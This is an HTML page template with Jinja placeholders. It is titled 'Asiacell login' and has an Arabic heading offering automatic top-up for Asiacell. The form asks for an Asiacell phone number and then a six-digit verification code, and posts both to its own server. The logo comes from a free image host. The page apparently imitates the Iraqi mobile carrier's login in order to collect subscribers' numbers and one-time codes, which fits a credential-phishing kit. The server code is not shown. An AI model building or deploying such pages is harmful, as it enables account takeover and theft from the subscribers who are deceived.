<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link
      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap"
      rel="stylesheet"
    />
<title>Asiacell login</title>
<style type="text/css">
body{
font-family: "Tajawal", sans-serif;

margin:0;
padding:0;
align-items:center;
text-align:center;
background-color:black;
}
.img1 {

width:150px;
height:150px;
margin-top:20px;
}
.phone {
margin-top:30px;
text-align:center;
align-items:center;

}

input {
font-family: "Tajawal", sans-serif;
outline:none;
border:none;
background-color:black;
color:white;
border: 1px solid red;
text-align:center;
font-size:20px;
padding:4px;
margin:10px;
width:90%;
height:2em;
border-radius:10px;
}

button {
font-family: "Tajawal", sans-serif;
background-color:black;
outline:none;
border:none;
color:white;
width:90%;
height:44px;
border-radius:10px;
margin-top:10px;
font-size:18px;
border: 1px solid green;
padding: 10px 20px;
transition: background-color 0.3s ease;
  
}

::-webkit-input-placeholder {
   color:#607D8B; /* تغيير اللون هنا */
}


h2 {
font-size:20px;
margin-top:30px;
color:white;
}

h6 {
font-size:15px;
margin-top:25px;
color:#607D8B;
}

.head {

  justify-content: center;
  align-items: center;


}


a{
color:#607D8B;
display:block;
text-decoration: none;
margin-top:25px;
}

header {
margin:0;
padding:0;
background-color:#17212B;
height:60px;
width:100%;
display:none;
text-align:left;
}
.back {
padding:0;
margin-top:8px;
font-family: "Tajawal", sans-serif;
background-color:#17212B;
outline:none;
border:none;
color:white;
width:50px;
height:44px;
border-radius:10px;
border: 1px solid #ccc;
font-size:18px;
transition: background-color 0.3s ease;
margin-left:5px;
}


p {
color:{{color}};
margin:0;
padding:0;
}
</style>
</head>
<body>
<header>
<div class="log" >
<button class="back" ><--</button>
</div>
</header>
<div class="head" >
<img class="img1" src="https://e.top4top.io/p_3447liuii0.png">
<h2>قسم شحن تلقائي في اسياسيل</h2>
</div>


<form method="POST" >
<div class="phone" >
{% if sendcode %}
<input tabindex="0" name="code" required="required" type="number" class="phone_input" placeholder="كود تحقق من 6 ارقام" >
{% else %}
<input tabindex="0" name="phone" required="required" type="number" class="phone_input" placeholder="رقم الهاتف الاسياسيل" >
{% endif %}

{% if iserror %}
<p>{{text}}</p>
{% endif %}
<button name="{{t}}" value="ok"  class="btn" >تسجيل دخول (Asiacell)</button>
</form>
</div>


</body>
<script>
  var btn = document.querySelector('.btn');
  
  btn.addEventListener('click', function() {
    btn.style.backgroundColor = "blue";
    btn.style.color = "white";
    btn.style.border = "none";
  });
  
</script>

<script type="text/javascript">
document.querySelector('.back').addEventListener("click", function() {
  
  window.history.back();
});
</script>
</html>
